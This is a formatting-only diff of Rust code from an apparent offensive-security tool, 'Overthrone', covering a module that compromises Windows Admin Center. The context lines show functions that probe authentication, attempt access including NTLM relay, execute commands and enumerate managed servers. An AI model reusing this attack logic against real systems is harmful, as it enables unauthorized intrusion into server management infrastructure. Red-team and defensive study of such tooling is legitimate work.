@@ -91,10 +91,7 @@ pub struct WacCompromiseResult {
 
 fn base_url(config: &WacCompromiseConfig) -> String {
     let scheme = if config.use_tls { "https" } else { "http" };
-    format!(
-        "{}://{}:{}",
-        scheme, config.target_host, config.target_port
-    )
+    format!("{}://{}:{}", scheme, config.target_host, config.target_port)
 }
 
 fn build_client(config: &WacCompromiseConfig) -> Result<reqwest::Client> {
@@ -103,7 +100,9 @@ fn build_client(config: &WacCompromiseConfig) -> Result<reqwest::Client> {
         .danger_accept_invalid_certs(config.accept_self_signed)
         .cookie_store(true);
     client_builder = client_builder.user_agent("Overthrone/0.2.1");
-    client_builder.build().map_err(|e| OverthroneError::custom(format!("HTTP client build failed: {e}")))
+    client_builder
+        .build()
+        .map_err(|e| OverthroneError::custom(format!("HTTP client build failed: {e}")))
 }
 
 pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromiseResult> {
@@ -125,7 +124,10 @@ pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromis
     let auth_methods = probe_wac_auth(&client, &base).await?;
     log.push(format!(
         "  Detected auth methods: {:?}",
-        auth_methods.iter().map(|m| m.to_string()).collect::<Vec<_>>()
+        auth_methods
+            .iter()
+            .map(|m| m.to_string())
+            .collect::<Vec<_>>()
     ));
 
     log.push(format!("Attempting access via {} ...", config.auth_method));
@@ -155,7 +157,10 @@ pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromis
             command_executed = executed;
             command_output = output.clone();
             if executed {
-                log.push(format!("  Output: {}", output.as_deref().unwrap_or("(empty)")));
+                log.push(format!(
+                    "  Output: {}",
+                    output.as_deref().unwrap_or("(empty)")
+                ));
             } else {
                 log.push("  Command execution failed".to_string());
             }
@@ -182,15 +187,13 @@ pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromis
     })
 }
 
-async fn discover_wac_version(
-    client: &reqwest::Client,
-    base: &str,
-) -> Result<Option<String>> {
+async fn discover_wac_version(client: &reqwest::Client, base: &str) -> Result<Option<String>> {
     let url = format!("{base}/api/identities");
     match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
         Ok(resp) => {
             let status = resp.status();
-            let server: Option<String> = resp.headers()
+            let server: Option<String> = resp
+                .headers()
                 .get("server")
                 .and_then(|v| v.to_str().ok())
                 .map(|s| s.to_string());
@@ -209,10 +212,7 @@ async fn discover_wac_version(
     }
 }
 
-async fn probe_wac_auth(
-    client: &reqwest::Client,
-    base: &str,
-) -> Result<Vec<WacAuthMethod>> {
+async fn probe_wac_auth(client: &reqwest::Client, base: &str) -> Result<Vec<WacAuthMethod>> {
     let mut methods = Vec::new();
     let url = format!("{base}/api/identities/authTypes");
     match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
@@ -270,7 +270,9 @@ async fn attempt_wac_access(
                         Ok((true, Some(login_url)))
                     }
                     Ok(r) if r.status().as_u16() == 401 => {
-                        info!("NTLM relay rejected (401) — WAC requires interactive auth or Kerberos");
+                        info!(
+                            "NTLM relay rejected (401) — WAC requires interactive auth or Kerberos"
+                        );
                         Ok((false, None))
                     }
                     Ok(r) => {
@@ -342,10 +344,7 @@ async fn attempt_wac_access(
     }
 }
 
-async fn enumerate_managed_servers(
-    client: &reqwest::Client,
-    base: &str,
-) -> Result<Vec<String>> {
+async fn enumerate_managed_servers(client: &reqwest::Client, base: &str) -> Result<Vec<String>> {
     let mut servers = Vec::new();
     let url = format!("{base}/api/connections/servers");
     match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
